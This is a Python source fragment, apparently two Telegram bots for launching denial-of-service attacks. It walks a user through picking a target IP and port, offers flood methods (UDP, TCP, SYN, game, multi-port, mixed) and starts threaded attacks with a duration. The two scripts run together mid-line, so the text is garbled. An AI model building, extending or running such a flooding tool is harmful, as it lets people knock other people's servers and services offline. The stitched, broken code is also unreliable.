        context.user_data['step'] = None
        show_port_buttons(update.message.reply_text, ip)

    elif step == 'waiting_port':
        port = update.message.text.strip()
        context.user_data['port'] = port
        context.user_data['step'] = None
        keyboard = [
            [InlineKeyboardButton("🔵 UDP", callback_data="method_udp"),
             InlineKeyboardButton("🔴 TCP", callback_data="method_tcp")],
            [InlineKeyboardButton("🟡 SYN", callback_data="method_syn"),
             InlineKeyboardButton("🟢 Game", callback_data="method_game")],
            [InlineKeyboardButton("🟣 Multi-Port", callback_data="method_multiport")],
            [InlineKeyboardButton("⚫ MIXED", callback_data="method_mixed")],
        ]
        update.message.reply_text(
            f"✅ Port: `{port}`\n\n💣 *Method select karo:*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )


# ============================================
#                  MAIN
# ============================================

def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(button_callback))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_text))

    print("✅ Bot Started! Run with sudo for SYN flood support.")
    updater.start_polling()
    updater.idle()


if __name__ == "__main__":
    main()    if not d:
        return
    threads = int(q.data)
    q.edit_message_text(f"🔥 Attack on {d['ip']}:{d['port']} | {threads} thr | {d['time']}s")
    threading.Thread(target=start_attack, args=(d['ip'], d['port'], threads, d['time'])).start()

def stop(update, context):
    global attack_active
    attack_active = False
    update.message.reply_text("🛑 Stopped")

def main():
    u = Updater(TOKEN, use_context=True)
    u.dispatcher.add_handler(CommandHandler("start", start))
    u.dispatcher.add_handler(CommandHandler("stop", stop))
    u.dispatcher.add_handler(CallbackQueryHandler(button))
    u.dispatcher.add_handler(MessageHandler(Filters.text, handle))
    print("Bot Running...")
    u.start_polling()
    u.idle()

if __name__ == "__main__":
    main()
